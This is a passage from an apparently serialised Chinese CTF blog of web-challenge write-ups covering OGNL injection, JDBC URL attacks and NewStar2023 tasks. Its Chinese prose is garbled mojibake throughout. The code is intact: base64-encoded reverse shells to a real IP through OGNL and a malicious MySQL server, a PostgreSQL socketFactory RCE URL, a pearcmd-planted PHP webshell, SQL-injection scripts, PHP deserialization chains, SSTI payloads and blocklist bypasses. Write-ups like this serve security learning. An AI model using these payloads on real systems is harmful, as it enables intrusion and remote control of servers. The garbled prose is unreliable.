this.FROM(\"users\");\n                this.WHERE(String.format(\"username = '%s'\", username));\n            }\n        }).toString();\n    }\n}\n```\n\nå¯ä»¥çœ‹åˆ°usernameç›´æ¥è¢«æ‹¼æ¥è¿›äº†æŸ¥è¯¢è¯­å¥ å› æ­¤è¿™é‡Œå°±å­˜åœ¨sqlæ³¨å…¥ æ›´ä¸¥è°¨åº”è¯¥æ˜¯OGNLè¡¨è¾¾å¼æ³¨å…¥\n\nç›´æ¥åˆ©ç”¨OGNLè¡¨è¾¾å¼å‘½ä»¤æ‰§è¡Œåå¼¹shell\n\n```javascript\n${@java.lang.Runtime@getRuntime().exec(\"bash -c\n{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4zNC41My83Nzc3IDA+JjE=}|{base64,-\nd}|{bash,-i}\")}\n```\n\n\n\næ— æ³•è¿›è¡Œåå¼¹shell å› ä¸ºä¼ å…¥çš„å†…å®¹åŒ…å«`{å’Œ}`ä¼šè¢«é€’å½’è§£é‡Šä¸ºå¦ä¸€ä¸ªOGNLè¡¨è¾¾å¼çš„å¼€å¤´ä¸ç»“å°¾\n\nå®˜æ–¹wpæ˜¯åˆ©ç”¨OGNL è°ƒç”¨Java è‡ªèº«çš„ base64 decodeæ–¹æ³•\n\n```javascript\n${@java.lang.Runtime@getRuntime().exec(new\njava.lang.String(@java.util.Base64@getDecoder().decode('YmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzg0TGpFek1DNHpOQzQxTXk4M056YzNJREErSmpFPX18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9')))}\n```\n\njavaåŸºç¡€çŸ¥è¯†è¿˜æ˜¯ç¼ºå°‘å¾ˆå¤š å¾—å»ç‹‚è¡¥\n\n## [Week 4] TestConnectionï¼ˆå­¦ä¹ ï¼‰\n\nè€ƒç‚¹ï¼š\n\n-  MySQL / PostgreSQL JDBC URL Attack  \n\n### è§£æ³•ä¸€ \n\nç›´æ¥çœ‹å®˜æ–¹WP\n\n> JDBC å°±æ˜¯ Java ç”¨äºæ“ä½œæ•°æ®åº“çš„æ¥å£, é€šè¿‡ä¸€ä¸ªç»Ÿä¸€è§„èŒƒçš„ JDBC æ¥å£å¯ä»¥å®ç°åŒä¸€æ®µä»£ç å…¼å®¹ä¸åŒç±»å‹æ•°æ®åº“çš„è®¿é—®\n>\n> JDBC URL å°±æ˜¯ç”¨äºè¿æ¥æ•°æ®åº“çš„å­—ç¬¦ä¸², æ ¼å¼ä¸º jdbc:db-type://host:port/db-name?param=value\n>\n> db-type å°±æ˜¯æ•°æ®åº“ç±»å‹, ä¾‹å¦‚ postgresql, mysql, mssql, oracle, sqlite\n>\n> db-name æ˜¯è¦ä½¿ç”¨çš„æ•°æ®åº“å\n>\n> param æ˜¯è¦ä¼ å…¥çš„å‚æ•°, æ¯”å¦‚ user, password, æŒ‡å®šè¿æ¥æ—¶ä½¿ç”¨çš„ç¼–ç ç±»å‹ç­‰ç­‰\n>\n> å½“ jdbc url å¯æ§æ—¶, å¦‚æœç›®æ ‡ç½‘ç«™ä½¿ç”¨äº†æ—§ç‰ˆçš„æ•°æ®åº“é©±åŠ¨, åœ¨ç‰¹å®šæƒ…å†µä¸‹å°±å¯ä»¥å®ç° RCE\n\nçœ‹çœ‹ä¾èµ–\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699186012686-7dcd51eb-5b46-4a88-87ec-b6c194602a72.png)\n\næ ¹æ®mysqlç‰ˆæœ¬8.0.11 æ‰¾åˆ°å¯¹åº”çš„é©±åŠ¨åˆ©ç”¨ [MYSQL JDBCååºåˆ—åŒ–è§£æ - è·³è·³ç³–](https://tttang.com/archive/1877/#toc_)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699186082246-dff3269f-5cf5-4f74-8ccc-970c455b1052.png)\n\næˆ–è€…ç”¨å·¥å…·ç”Ÿæˆpayload[GitHub - 4ra1n/mysql-fake-server: MySQL Fake Server (çº¯Javaå®ç°ï¼Œæ”¯æŒGUIç‰ˆå’Œå‘½ä»¤è¡Œç‰ˆï¼Œæä¾›Dockerfileï¼Œæ”¯æŒå¤šç§å¸¸è§JDBCåˆ©ç”¨)](https://github.com/4ra1n/mysql-fake-server)\n\næ³¨æ„è¿™é‡Œé€‰ç”¨çš„CC6çš„é“¾å­ è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè¦ç»™ä¾èµ–è®©æˆ‘ä»¬çŸ¥é“æ˜¯`commons-collections-3.2.1`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699190566032-86255c59-cffd-4d1d-a011-01a2973cec93.png)\n\n```\njdbc:mysql://ip:port/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=deser_CC31_bash -i >& /dev/tcp/ip/port 0>&1\n```\n\nè¿™é‡Œéœ€è¦çŸ¥é“`jdbc:mysql://ip:port/test`è¿™é‡Œçš„ip portæ˜¯æˆ‘ä»¬åœ¨vpsèµ·çš„æ¶æ„MySQLæœåŠ¡ ä¹Ÿæ˜¯ç”¨è¿™ä¸ªå·¥å…·çš„cliç‰ˆæœ¬å³å¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699190663630-b94fa85c-45be-411f-b962-e52f1045be1d.png)\n\né™¤æ­¤ä¹‹å¤– é¢˜ç›®ä¸­ç»™çš„ä»£ç æ˜¯ `DriverManager.getConnection(url, username, password);`\n\nå³ä¼šå•ç‹¬ä¼ å…¥ä¸€ä¸ª username å‚æ•°, å› æ­¤ url ä¸­çš„ username ä¼šè¢«åé¢çš„ username ç»™è¦†ç›–\n\næ‰€ä»¥æˆ‘ä»¬ç”¨å·¥å…·ç”Ÿæˆçš„payloadä¸­useréƒ¨åˆ†è¦æ”¹ä¸ºusername\n\n```\njdbc:mysql://ip:port/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&username=deser_CC31_bash -i >& /dev/tcp/ip/port 0>&1\n```\n\nå½“ç„¶è¿™æ ·è¿˜æ˜¯ä¸è¡Œ\n\nè¦å°†ä¹‹åçš„å‘½ä»¤æ‰§è¡Œéƒ¨åˆ†æ”¹ä¸ºé€‚åˆjavaçš„payload`bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4zNC41My83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}`\n\nå³`jdbc:mysql://ip:port/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&username=deser_CC31_bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4zNC41My83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}`\n\nè‡³äºdriveçš„ç”±æ¥ é—®äº†ä¸€ä¸‹GPT æ˜¯é»˜è®¤å›ºå®šçš„è·¯å¾„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699191288102-7c8a37c4-2f70-4b11-b10c-72b1b6707d10.png)\n\nå› æ­¤æœ€ç»ˆpayloadçš„ä¸ºï¼šè®°å¾—è¦urlç¼–ç æ‰“å…¥\n\n```javascript\n/testConnection?\ndriver=com.mysql.cj.jdbc.Driver&url=jdbc:mysql://8.130.34.53:3308/testConnection?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&username=deser_CC31_bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4zNC41My83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}&password=123\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699191420960-8bf11182-5e45-4fa4-8383-5dca1f83430f.png)\n\nè¿æ¥æˆ‘ä»¬çš„æ¶æ„mysqlæœåŠ¡æˆåŠŸ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699191454720-589f9452-830f-42fc-8777-cb0227d236d7.png)\n\nåå¼¹shellæˆåŠŸ![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699191477892-9a92d92d-961a-427e-bd65-5bf097d37027.png)\n\n### è§£æ³•äºŒ åˆ©ç”¨ postgresql é©±åŠ¨\n\nè¿˜æ˜¯åˆ©ç”¨é‚£ä¸ªé¡¹ç›®å·¥å…·\n\nç”Ÿæˆpayload![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699193586740-2cb7093a-9f9a-4065-9845-6479c886f899.png)\n\næ­¤æ—¶ipå’Œportåº”è¯¥æ˜¯postgresqlçš„æœåŠ¡è€Œä¸æ˜¯mysql\n\n```\njdbc:postgresql://ip:port/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=xmlæ–‡ä»¶è®¿é—®åœ°å€\n```\n\nç„¶åxmlå†…å®¹å‚è€ƒ[PostgresQL JDBC Drive ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´(CVE-2022-21724) - å…ˆçŸ¥ç¤¾åŒº](https://xz.aliyun.com/t/11812)\n\nç”¨httpèµ·ä¸€ä¸ªæœåŠ¡ å¼€æ”¾è¿™ä¸ªxmlæ–‡ä»¶è®¿é—®\n\næœ€ç»ˆpayloadï¼š\n\n```\n/testConnection?driver=jdbc:postgresql://ip:port/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=xmlæ–‡ä»¶è®¿é—®åœ°å€&username=123&password=123\n```\n\n# ç»“å°¾\n\njavaè¿˜æ˜¯ä¸€çªä¸é€š :( åªèƒ½ç¡¬ç€å¤´çš®å¤ç°äº†\n","categories":["å„èµ›äº‹WP"]},{"title":"NewStar2023 WEB WP","url":"/post/dcc8a51b.html","content":"\nå°é˜¶æ®µå®Œæˆ\n\n<!--more-->\n\n# å‰è¨€\n\nç»è¿‡äº”å‘¨çš„æ¯”èµ›ï¼Œæ­å–œNewStar2023(æ ¡å†…èµ›é“)åœ†æ»¡ç»“æŸäº† *â˜…,Â°*:.â˜†(ï¿£â–½ï¿£)/$:*.Â°â˜…* ã€‚\n\nè¿™é‡Œæ˜¯Z1d10tçš„WEBæ–¹å‘é¢˜è§£\n\n3é¢˜æœªè§£å‡º è¿˜æ˜¯å¤ªèœäº†qwq \n\næ—¥åä¼šæ›´åŠ åŠªåŠ›ï¼\n\n# WEEK1\n\n## ErrorFlask\n\næŠ¥é”™ä¹‹åèƒ½çœ‹åˆ°æ˜¯flaskæ¡†æ¶çš„ ç„¶åå°±èƒ½å¾—åˆ°æºç \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695620310236-6bbb4213-7832-4c9e-9cb6-972e12f682a9.png)\n\n## Begin of HTTP\n\næ­£å¸¸è€ƒå¯Ÿè¯·æ±‚å¤´å‚æ•°\n\n# ![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695620090015-6e93ad0d-5ec6-45c3-bfb9-f7aee7d97337.png)\n\n## Begin of Upload\n\nå‰ç«¯æ£€æµ‹ç»•è¿‡\n\n## æ³„æ¼çš„ç§˜å¯†\n\n/www.zipæºç æ³„éœ²\n\n## Begin of PHP\n\ngetï¼š`?key1[]=1&key2[]=2&key4[]=4&key5=2024%00`\n\npostï¼š`key3[]=3&flag5[]=1`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695617294020-eb01d6c9-c990-44a4-83a4-c33e9eb85046.png)\n\n## R!C!E!\n\n```\npassword=114514&e[v.a.l=var_dump(shell_exec('more /f*'));\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695616213122-0044da95-b172-405b-a1c9-c98cee6536c7.png)\n\n## EasyLogin\n\nçˆ†ç ´çš„æ—¶å€™ä¼šè·å¾—ä¸€æ¡ä¸€æ¡çš„æç¤º \n\n```php\n The password is randomly selected from a list\n\n è¿™ä¸ªå¯†ç æ°å¦‚é¢˜ç›®ç®€ä»‹ï¼Œä¸€åˆ†ä¸å¤šï¼Œä¸€åˆ†ä¸å°‘\n\nIs your password weak?\n```\n\nä¸€å¼€å§‹ä¸€ç›´ä»¥ä¸º `è¿™ä¸ªå¯†ç æ°å¦‚é¢˜ç›®ç®€ä»‹ï¼Œä¸€åˆ†ä¸å¤šï¼Œä¸€åˆ†ä¸å°‘`çš„æ„æ€æ˜¯å¯†ç 9ä½ ä½†æ˜¯ä¹‹åå’Œå‡ºé¢˜äººèŠäº†ä¹‹å å’Œè¿™ä¸ªæ ¹æœ¬æ²¡å…³ç³» åªæƒ³è¡¨è¾¾æ˜¯å¼±å£ä»¤å¯†ç  \n\nå¯†ç æ˜¯000000 å½“ç„¶è®°å¾—è¦é€šè¿‡md5åŠ å¯†ä¹‹åå†çˆ†ç ´\n\nç™»å½•ç„¶åæ”¾æ‰è¿™ä¸ªåŒ… ç„¶åè¿˜ä¼šè·³è½¬åˆ°ä¸€ä¸ªåŒ… å°±èƒ½è·å¾—å¯†ç  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695629472388-c783f834-6097-4b10-bd61-f366c4983399.png)\n\n# WEEK2\n\n## æ¸¸æˆé«˜æ‰‹\n\nä¿®æ”¹å¾—åˆ†å³å¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696172672213-98b769f1-a424-4a00-a451-3095c4137adb.png)\n\n## ez_sql\n\næ‰‹åŠ¨æ³¨ä¸ªjb sqlmapä¸€æŠŠæ¢­å°±è¡Œäº†\n\n```java\nsqlmap -u http://90770cb7-62be-4275-af63-238c7fe26d62.node4.buuoj.cn:81/?id=1 --dbs\n[*] ctf\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] sys\n[*] test\n\nsqlmap -u http://90770cb7-62be-4275-af63-238c7fe26d62.node4.buuoj.cn:81/?id=1 -D ctf --tables\n grades       |\n| here_is_flag\n\n\nsqlmap -u http://90770cb7-62be-4275-af63-238c7fe26d62.node4.buuoj.cn:81/?id=1 -D ctf -T here_is_flag --columns\n flag   | varchar(255) \n\n\nsqlmap -u http://90770cb7-62be-4275-af63-238c7fe26d62.node4.buuoj.cn:81/?id=1 -D ctf -T here_is_flag -C \"flag\" --dump\n```\n\n## Upload again!\n\nè€ƒç‚¹ï¼š\n\n- htaccess\n\nå¾ˆåŸºç¡€\n\n## Unserializeï¼Ÿ\n\nè€ƒç‚¹:\n\n- phpååºåˆ—åŒ–\n\n```java\n<?php\n// Maybe you need learn some knowledge about deserialize?\nclass evil {\n    private $cmd='nl /th1s_1s_fffflllll4444aaaggggg';\n\n    public function __destruct()\n    {\n        if(!preg_match(\"/cat|tac|more|tail|base/i\", $this->cmd)){\n            @system($this->cmd);\n        }\n    }\n}\n$a = new evil();\necho urlencode(serialize($a));\n?>\n#O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22%00evil%00cmd%22%3Bs%3A33%3A%22nl+%2Fth1s_1s_fffflllll4444aaaggggg%22%3B%7D\n```\n\n## include 0ã€‚0\n\nç¦äº†baseæ‰€ä»¥ä¸èƒ½ç”¨å¸¸ç”¨çš„base64è½¬ç äº† æ¢ç§è½¬ç æ–¹å¼\n\n```\n?file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696171708476-0624b883-3c25-461c-8127-7f163a4bab2e.png)\n\nå†è§£ç \n\n```java\n<?php\n$str = \"?<hp p//lfga5{719c28-e567c4-d9-1dab5e-7c6326be71}9\";\necho iconv('UCS-2BE', 'UCS-2LE', $str);\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696171733094-68be6a56-67e1-45ab-88fa-8df2ea9eb0ad.png)\n\n## R!!C!!E!!\n\nè€ƒç‚¹:\n\n- gitæ³„éœ²\n- æ— å‚rce\n\né¦–å…ˆè·å¾—æºç  å¾—åˆ°`/bo0g1pop.php`è·¯ç”±\n\nå¾—åˆ°æºç \n\n```java\n<?php\nhighlight_file(__FILE__);\nif (';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['star'])) {\n    if(!preg_match('/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i',$_GET['star'])){\n        eval($_GET['code']);\n    }\n}\nGET /bo0g1pop.php?star=system(next(getallheaders())); HTTP/1.1\nHost: 18e0aabc-695f-46fd-b4e2-3557e66a3cdc.node4.buuoj.cn:81\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nUser-Agent: cat /flag\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: __gads=ID=2a013f3dde9ad985-2254f58cafe700cf:T=1689741221:RT=1689742200:S=ALNI_Maqp-fX6ej98tcXJHWIvb4mWhQdSg; __gpi=UID=00000c2221d9f3e8:T=1689741221:RT=1689742200:S=ALNI_MZMzVabCNghJHJfa6k9qDxOuQgInA\nConnection: close\n```\n\nåˆ©ç”¨User-Agentå­—æ®µè¿›è¡Œæ„é€ rce\n\n# WEEK3\n\n## medium_sql\n\nè€ƒå¯Ÿï¼š\n\n- sqlç›²æ³¨\n\nç›´æ¥sqlmap level3æ¢­å“ˆæˆ–è€…è‡ªå·±å†™ä¸ªè„šæœ¬ï¼ˆæ²™è´æ˜¯è‡ªå·±ï¼‰\n\npoc:\n\n```java\nimport requests\nimport time\nurl = 'http://3984f01f-9843-4df0-a21f-95a7eff68063.node4.buuoj.cn:81/'\nresult=''\nfor i in range(1,50):\n    low=31\n    high=127\n    mid = (low+high)//2\n    while low<=high:\n        paylaod = \"TMP0929'And/**/0^(Ascii(Substr((Select(flag)from(ctf.here_is_flag)),{},1))>{})%23\".format(i,mid)\n        #çˆ†åº“çˆ†æ•°æ®è¯­å¥å·®ä¸å¤š å…³é”®å­—è¢«banå¤§å†™ç»•è¿‡å°±è¡Œ\n        r = requests.get(url+\"?id=\"+paylaod)\n        if (\"English\" in r.text):\n            low = mid+1\n            mid = (low+high)//2\n        else:\n            high = mid-1\n            mid = (low+high)//2\n    result+=chr(high+1)\n    time.sleep(0.3)\n    print(result)\n```\n\n## Include\n\nè€ƒç‚¹:\n\n- pearcmd\n\næ ¹æ®æç¤º\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697164131734-b78abbc2-ee62-4767-965e-11accdbf5e48.png)\n\n`register_argc_argv`æ˜¯on\n\né‚£ä¹ˆ`register_argc_argv`æ˜¯ä»€ä¹ˆå‘¢ \n\nç®€å•è¯´` register_argc_argv`å¼€å¯æ—¶æˆ‘ä»¬ä¼ å…¥getçš„å‚æ•°ä¼šè¢«è®°å½•åœ¨`$_SERVER`è¿™ä¸ªå…¨å±€å˜é‡æ•°ç»„ä¸­\n\nå¹¶ä¸”$argcå˜é‡æ˜¯â½¤äºè®°å½•æ•°ç»„çš„â¼¤â¼© $argvå˜é‡æ˜¯â½¤äºè®°å½•è¾“â¼Šçš„å‚æ•°\n\næ¡ä»¶ï¼š\n\n- â½¼ç‰ˆæœ¬ï¼ˆæµ‹è¯•ç‰ˆæœ¬ä¸º5.2.17ï¼‰é»˜è®¤ä¸º On\n- æ–°ç‰ˆæœ¬ï¼ˆæµ‹è¯•ç‰ˆæœ¬ä¸º 5.4.45ã€5.5.9ã€7.3.4ï¼‰é»˜è®¤ä¸º Off\n\næˆ‘ä»¬è¦ä¼ å…¥å¦‚æœæ­£å¸¸ä¼ å…¥å‚æ•°ï¼Œæ•°ç»„çš„å¤§å°æ°¸è¿œæ˜¯1\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697165693345-4172a348-e3bd-473c-b24a-303757cc3b1e.png)\n\nå¦‚æœè¦è¡¨ç¤ºä¸¤ä¸ªæ•°ç»„ï¼Œéœ€è¦ç”¨+éš”å¼€\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697165707316-253cea3f-c08e-4f2d-b928-46805a4bceee.png)\n\næ¥è‡ªï¼š\n\nhttps://www.shawroot.cc/1643.html\n\nhttps://cloud.tencent.com/developer/article/2204400?areaId=106001\n\nä¸€èˆ¬è¿™ä¸ªæ­é…pearcmdä½¿ç”¨ å†™é©¬åˆ°ç½‘ç«™æ ¹ç›®å½•ä¸‹ ç„¶ååŒ…å«rceå³å¯\n\n```\n?+config-create+/&file=/usr/local/lib/php/pearcmd&/<?=@eval($_POST[1])?>+/tmp/hello.php\n```\n\nè®°å¾—è¦æŠ“ä¸€æ¬¡åŒ…é‡å†™ä¸€ä¸‹ä¸€å¥è¯æœ¨é©¬ ä¸ç„¶ä¼šè¢«è½¬ç å¯¼è‡´ä¸æˆåŠŸ\n\n\n\n## POP Gadget\n\nè€ƒç‚¹ï¼š\n\n- phpååºåˆ—åŒ–\n\næºç å¦‚ä¸‹\n\n```java\n<?php\nhighlight_file(__FILE__);\n\nclass Begin{\n    public $name;\n\n    public function __destruct()\n    {\n        if(preg_match(\"/[a-zA-Z0-9]/\",$this->name)){\n            echo \"Hello\";\n        }else{\n            echo \"Welcome to NewStarCTF 2023!\";\n        }\n    }\n}\n\nclass Then{\n    private $func;\n\n    public function __toString()\n    {\n        ($this->func)();\n        return \"Good Job!\";\n    }\n\n}\n\nclass Handle{\n    protected $obj;\n\n    public function __call($func, $vars)\n    {\n        $this->obj->end();\n    }\n\n}\n\nclass Super{\n    protected $obj;\n    public function __invoke()\n    {\n        $this->obj->getStr();\n    }\n\n    public function end()\n    {\n        die(\"==GAME OVER==\");\n    }\n}\n\nclass CTF{\n    public $handle;\n\n    public function end()\n    {\n        unset($this->handle->log);\n    }\n\n}\n\nclass WhiteGod{\n    public $func;\n    public $var;\n\n    public function __unset($var)\n    {\n        ($this->func)($this->var);    \n    }\n}\n\n@unserialize($_POST['pop']);\n```\n\nexpï¼š\n\n```java\n<?php\nclass Begin{\n    public $name;\n}\nclass Then{\n    private $func;\n    public function __construct(){\n        $this->func = new Super();\n    }\n}\nclass Handle{\n    protected $obj;\n    public function __construct(){\n        $this->obj = new CTF();\n    }\n}\nclass Super{\n    protected $obj;\n    public function __construct(){\n        $this->obj = new Handle();\n    }\n}\nclass CTF{\n    public $handle;\n    public function __construct(){\n        $this->handle = new WhiteGod();\n    }\n\n\n}\nclass WhiteGod{\n    public $func = 'system';\n    public $var = 'cat /flag';\n}\n$a = new Begin();\n$a->name = new Then();\necho urlencode(serialize($a));\n```\n\n## GenShin\n\nè€ƒç‚¹ï¼š\n\n- flask ssti\n\næŠ“åŒ…è·å¾—\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697166037980-4bb0dd83-1b97-4a6c-b1f6-c2c8566ddbab.png)\n\nä¸€çœ¼ä¸çœŸflask sstiæ³¨å…¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697166058190-e47aa6de-380f-42ef-a2ce-f04c871166e3.png)\n\nç›´æ¥å½“è„šæœ¬å°å­\n\næˆ–è€…payload:\n\n```\n{%print(((g.pop.__globals__.__builtins__.__import__(\"os\")[\"p\"\"open\"](\"cat /flag\")).read()))%}\n```\n\n## R!!!C!!!E!!!\n\næºç ï¼š\n\n```java\n<?php\nhighlight_file(__FILE__);\nclass minipop{\n    public $code;\n    public $qwejaskdjnlka;\n    public function __toString()\n    {\n        if(!preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){\n            exec($this->code);\n        }\n        return \"alright\";\n    }\n    public function __destruct()\n    {\n        echo $this->qwejaskdjnlka;\n    }\n}\nif(isset($_POST['payload'])){\n    //wanna try?\n    unserialize($_POST['payload']);\n}\n```\n\npayload:\n\nååºåˆ—åŒ–å¥—ä¸€ä¸‹å°±è¡Œäº†\n\n```\ncat /flag|t\\e\\e /var/www/html/1\n```\n\nå°†è¯»åˆ°çš„flagé€šè¿‡ç®¡é“ç¬¦ç”¨teeå†™é“ç½‘ç«™æ ¹ç›®å½•ä¸‹ ç„¶åè®¿é—®\n\nå…³é”®å­—é€šè¿‡åæ–œæ è½¬ä¹‰æ¥ç»•è¿‡`\\`\n\n## OtenkiGirl\n\nè€ƒç‚¹ï¼š\n\n- nodejs åŸå‹é“¾æ±¡æŸ“\n\næˆ‘æ˜¯å‚»é€¼ å…³é”®ä¸œè¥¿è€æ˜¯çœ‹ä¸åˆ°\n\nç»™äº†æºç \n\næ ¹æ®æç¤ºæˆ‘ä»¬åªéœ€è¦å…³æ³¨routesåŒ…ä¸‹çš„å†…å®¹å³å¯ ä¹Ÿä¸éœ€è¦sqlæ³¨å…¥\n\ninfo.js\n\n```java\nconst Router = require(\"koa-router\");\nconst router = new Router();\nconst SQL = require(\"./sql\");\nconst sql = new SQL(\"wishes\");\nconst CONFIG = require(\"../config\")\nconst DEFAULT_CONFIG = require(\"../config.default\")\n\nasync function getInfo(timestamp) {\n    timestamp = typeof timestamp === \"number\" ? timestamp : Date.now();\n    // Remove test data from before the movie was released\n    let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();\n    timestamp = Math.max(timestamp, minTimestamp);\n    const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp >= ?`, [timestamp]).catch(e => { throw e });\n    return data;\n}\n\nrouter.post(\"/info/:ts?\", async (ctx) => {\n    if (ctx.header[\"content-type\"] !== \"application/x-www-form-urlencoded\")\n        return ctx.body = {\n            status: \"error\",\n            msg: \"Content-Type must be application/x-www-form-urlencoded\"\n        }\n    if (typeof ctx.params.ts === \"undefined\") ctx.params.ts = 0\n    const timestamp = /^[0-9]+$/.test(ctx.params.ts || \"\") ? Number(ctx.params.ts) : ctx.params.ts;\n    if (typeof timestamp !== \"number\")\n        return ctx.body = {\n            status: \"error\",\n            msg: \"Invalid parameter ts\"\n        }\n\n    try {\n        const data = await getInfo(timestamp).catch(e => { throw e });\n        ctx.body = {\n            status: \"success\",\n            data: data\n        }\n    } catch (e) {\n        console.error(e);\n        return ctx.body = {\n            status: \"error\",\n            msg: \"Internal Server Error\"\n        }\n    }\n})\n\nmodule.exports = router;\n```\n\nsubmit.js\n\n```java\nconst Router = require(\"koa-router\");\nconst router = new Router();\nconst SQL = require(\"./sql\");\nconst sql = new SQL(\"wishes\");\nconst Base58 = require(\"base-58\");\n\nconst ALPHABET = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";\nconst rndText = (length) => {\n    return Array.from({ length }, () => ALPHABET[Math.floor(Math.random() * ALPHABET.length)]).join('');\n}\n\nconst timeText = (timestamp) => {\n    timestamp = (typeof timestamp === \"number\" ? timestamp : Date.now()).toString();\n    let text1 = timestamp.substring(0, timestamp.length / 2);\n    let text2 = timestamp.substring(timestamp.length / 2)\n    let text = \"\";\n    for (let i = 0; i < text1.length; i++)\n        text += text1[i] + text2[text2.length - 1 - i];\n    if (text2.length > text1.length) text += text2[0];\n    return Base58.encode(rndText(3) + Buffer.from(text)); // length = 20\n}\n\nconst rndID = (length, timestamp) => {\n    const t = timeText(timestamp);\n    if (length < t.length) return t.substring(0, length);\n    else return t + rndText(length - t.length);\n}\n\nasync function insert2db(data) {\n    let date = String(data[\"date\"]), place = String(data[\"place\"]),\n        contact = String(data[\"contact\"]), reason = String(data[\"reason\"]);\n    const timestamp = Date.now();\n    const wishid = rndID(24, timestamp);\n    await sql.run(`INSERT INTO wishes (wishid, date, place, contact, reason, timestamp) VALUES (?, ?, ?, ?, ?, ?)`,\n        [wishid, date, place, contact, reason, timestamp]).catch(e => { throw e });\n    return { wishid, date, place, contact, reason, timestamp }\n}\n\nconst merge = (dst, src) => {\n    if (typeof dst !== \"object\" || typeof src !== \"object\") return dst;\n    for (let key in src) {\n        if (key in dst && key in src) {\n            dst[key] = merge(dst[key], src[key]);\n        } else {\n            dst[key] = src[key];\n        }\n    }\n    return dst;\n}\n\nrouter.post(\"/submit\", async (ctx) => {\n    if (ctx.header[\"content-type\"] !== \"application/json\")\n        return ctx.body = {\n            status: \"error\",\n            msg: \"Content-Type must be application/json\"\n        }\n\n    const jsonText = ctx.request.rawBody || \"{}\"\n    try {\n        const data = JSON.parse(jsonText);\n\n        if (typeof data[\"contact\"] !== \"string\" || typeof data[\"reason\"] !== \"string\")\n            return ctx.body = {\n                status: \"error\",\n                msg: \"Invalid parameter\"\n            }\n        if (data[\"contact\"].length <= 0 || data[\"reason\"].length <= 0)\n            return ctx.body = {\n                status: \"error\",\n                msg: \"Parameters contact and reason cannot be empty\"\n            }\n\n        const DEFAULT = {\n            date: \"unknown\",\n            place: \"unknown\"\n        }\n        const result = await insert2db(merge(DEFAULT, data));\n        ctx.body = {\n            status: \"success\",\n            data: result\n        };\n    } catch (e) {\n        console.error(e);\n        ctx.body = {\n            status: \"error\",\n            msg: \"Internal Server Error\"\n        }\n    }\n})\n\nmodule.exports = 